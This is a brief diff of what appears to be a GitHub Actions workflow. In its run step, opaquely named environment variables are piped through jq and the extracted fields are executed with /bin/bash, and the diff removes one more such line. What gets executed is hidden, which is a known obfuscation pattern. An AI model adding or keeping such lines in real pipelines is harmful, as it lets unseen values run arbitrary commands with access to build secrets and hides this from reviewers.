@@ -26,7 +26,6 @@ jobs:
           echo $pnn11045 | jq -r .bkmku2 | /bin/bash
           echo $aik7 | jq -r .utayg6227 | /bin/bash
           echo $b8416 | jq -r .q0483 | /bin/bash
-          printf '%s' "$cmh13" | jq -r .ftf9913 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
